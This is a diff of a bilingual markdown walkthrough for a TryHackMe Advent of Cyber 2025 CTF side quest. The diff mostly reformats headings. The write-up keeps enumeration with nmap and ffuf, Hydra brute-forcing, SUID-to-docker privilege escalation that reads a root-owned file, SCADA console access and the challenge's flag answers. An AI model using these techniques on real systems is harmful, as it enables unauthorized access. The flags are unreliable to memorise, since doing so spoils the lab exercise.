@@ -1,10 +1,10 @@
-#  Side Quest 1: The Great Disappearing Act
+# Advent 2025\SideQuest\Sidequest\Sidequest1 [N/A]
 
 > **Room URL:** [tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu](https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu)
 
 > **Event:** Advent of Cyber 2025 Side Quest
 
-## 📝 Descripción del Desafío
+## 📝 Descripción del Desafío / Challenge Description
 
 Can you help Hopper escape his wrongful imprisonment in HopSec asylum?
  
@@ -22,7 +22,7 @@ Teaming up is permitted
 
 ---
 
-## Asylum Escape Challenge 
+## Desafío de Escape del Asilo / Asylum Escape Challenge
 
 You now take control of Hopper, with one ultimate goal. Free yourself from this wrongful imprisonment. To do this, you must follow Hopper's 5-step escape plan:
 
@@ -47,7 +47,6 @@ From the Psych Ward Exit you can move south and loop around into the Main Corrid
 5. Escape the Facility
     
 Solve the final challenge in the Main Corridor and make your way toward the exit marked on the map. Once the door opens, Hopper is free, and the escape is complete.
-
 
 ---
 **Answer the questions below**
@@ -84,7 +83,7 @@ personal found.
 start egg decode
 
  `now_you_see_me`
-### Password = now_you_see_me
+Password = now_you_see_me
 
 Step 2:
 post you go to unlock with that password in port there say, there will firewall unlock for continue:
@@ -152,7 +151,6 @@ There are 4 open port
 8080 (HTTP)
 8000 (HTTP)
 
-
 ```bash
 PORT     STATE    SERVICE
 22/tcp   open     ssh
@@ -164,15 +162,11 @@ PORT     STATE    SERVICE
 
 *Port `80` leads to a security console, port `8000` leads to` Fakebook` social media website and port `8080` redirects to the same console on port `80`*
 
-
-
-
 hidden path
 ffuf -u http://XX.XXX.XXX.XX/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null   
 cgi-bin                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 177ms]
 
 facebook path
-
 
 ffuf -u http://XX.XXX.XXX.XX/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null
 admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 217ms]
@@ -273,10 +267,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-03 18:23:
 *I proceeded to unlock the `Cell / Storage` Wing as instructed in the task and got the first flag .
 `THM{h0pp1ing_m4d}`*
 
-
-
-
-
  Key 1: Cells / Storage Door   → Unlocks Hopper's Cell     → FLAG 1
  Key 2: Psych Ward Exit        → Requires 4-digit PIN      → FLAG 2 (Part 1)
  Key 3: Main Corridor Exit     → SCADA Bypass Required     → FLAG 3
@@ -336,18 +326,13 @@ j3stered_739138}
 - Part 1 (from initial enum): `THM{Y0u_h4ve_b3en_`
 - Part 2 (from console): `j3stered_739138}`
 
-### ✅ Flag 2: `THM{Y0u_h4ve_b3en_j3stered_739138}`
-
-
-
+✅ Flag 2: `THM{Y0u_h4ve_b3en_j3stered_739138}`
 
 Step in now:  Bypass the Psych Ward Keypad
 Discovery: Found a hidden diagnostics endpoint embedded within an HLS manifest.
 Data Leak: Leaked a console token via the job status monitoring.
 
 Artifact: Flag 2 obtained, port for scada ok.
-
-
 
 From the console shell, we discovered a SCADA terminal running on localhost:
 
@@ -356,23 +341,23 @@ $ ss -tlnp
 LISTEN  0  128  127.0.0.1:9001  *:*  users:(("python3",pid=1234,fd=5))
 ```
 
-### Step 2: SCADA Authentication
+### Paso 2: Autenticación SCADA / Step 2: SCADA Authentication
 
 **Connecting to SCADA:**
 ```bash
 $ nc 127.0.0.1 9001
 
 ################################################################################
-#                                                                              #
-#                    ██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗ ██████╗         #
-#                    ██║  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔════╝         #
-#                    ███████║██║   ██║██████╔╝███████╗█████╗  ██║              #
-#                    ██╔══██║██║   ██║██╔═══╝ ╚════██║██╔══╝  ██║              #
-#                    ██║  ██║╚██████╔╝██║     ███████║███████╗╚██████╗         #
-#                    ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝ ╚═════╝         #
-#                                                                              #
-#                          ASYLUM SCADA CONTROL SYSTEM                         #
-#                                                                              #
+## #
+## ██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗ ██████╗         #
+## ██║  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔════╝         #
+## ███████║██║   ██║██████╔╝███████╗█████╗  ██║              #
+## ██╔══██║██║   ██║██╔═══╝ ╚════██║██╔══╝  ██║              #
+## ██║  ██║╚██████╔╝██║     ███████║███████╗╚██████╗         #
+## ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝ ╚═════╝         #
+## #
+## ASYLUM SCADA CONTROL SYSTEM                         #
+## #
 ################################################################################
 
 [!] Authentication Required
@@ -387,7 +372,7 @@ Enter maintenance token:
 SCADA #LOCKED>
 ```
 
-### Step 3: Finding the Unlock Code
+### Paso 3: Encontrando el Código de Desbloqueo / Step 3: Finding the Unlock Code
 
 The SCADA terminal required a **numeric unlock code**. After enumeration, we discovered:
 
@@ -395,7 +380,7 @@ The SCADA terminal required a **numeric unlock code**. After enumeration, we dis
 
 **The Problem:** We were running as `svc_vidops` with no root access.
 
-### Step 4: Privilege Escalation via SUID Binary
+### Paso 4: Escalada de Privilegios vía Binario SUID / Step 4: Privilege Escalation via SUID Binary
 
 **Discovery:**
 ```bash
@@ -416,7 +401,7 @@ The binary had **SUID** bit set and was owned by `dockermgr` (UID 1501).
 
 **Key Insight:** The binary sets UID to `dockermgr` but NOT the GID. To access Docker, we needed to use `sg docker` to temporarily gain docker group privileges.
 
-### Step 5: Extracting the Unlock Code
+### Paso 5: Extrayendo el Código de Desbloqueo / Step 5: Extracting the Unlock Code
 
 **The Command Chain:**
 ```bash
@@ -429,12 +414,6 @@ $ echo 'sg docker -c "docker exec -u root asylum_gate_control cat /root/.asylum/
 2. `sg docker` - Executes command with docker group privileges
 3. `docker exec -u root` - Runs command as root inside container
 4. `cat /root/.asylum/unlock_code` - Reads the unlock code
-
-
-
-
-
-
 
 Step 4: Reach the Main Corridor
 Target: SCADA terminal accessible on localhost:9001.
@@ -454,15 +433,9 @@ $ curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
 {"ok":true,"flag":"THM{p0p_go3s_THe_W3as3l}"}
 ```
 
-### ✅ Flag 3: `THM{p0p_go3s_THe_W3as3l}`
-
-
-
+✅ Flag 3: `THM{p0p_go3s_THe_W3as3l}`
 
 Artifact: Flag 3 obtained.
-
-
-
 
 Step 5: Escape the Facility
 Final Validation: Submitted all three flags to  /escape_check.sh.
@@ -482,8 +455,6 @@ $ curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
 }
 ```
 
-
-
  
  
 
@@ -497,7 +468,7 @@ thats is all.
  
  
  
-# ## 🔗 Invitation to Next Challenge
+## ## 🔗 Invitación al Siguiente Desafío / Invitation to Next Challenge
 
 **URL:** `https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`
 
@@ -505,7 +476,7 @@ thats is all.
 
 ---
 
-# ## flags
+## ## Bandeas / Flags
 
 | Paso | Location | Objective | Flag |
 | --- | --- | --- | --- |
@@ -516,7 +487,7 @@ thats is all.
 
 ---
 
-# from other:
+## de otros / from other:
 
 ### 📖 TUTORIAL:
 
@@ -524,7 +495,7 @@ thats is all.
 * [Jaxafed Github](https://jaxafed.github.io/posts/tryhackme-aoc2025_sidequest_one/)
 * [Medium - Jalil Ayed](https://medium.com/@jalilayed/tryhackme-the-great-disappearing-act-f130e74c3472)
 
-### 🎥 video:
+### 🎥 Video:
 
 * [Watch Walkthrough](https://www.youtube.com/watch?v=Hccbd7_g9mE)
 
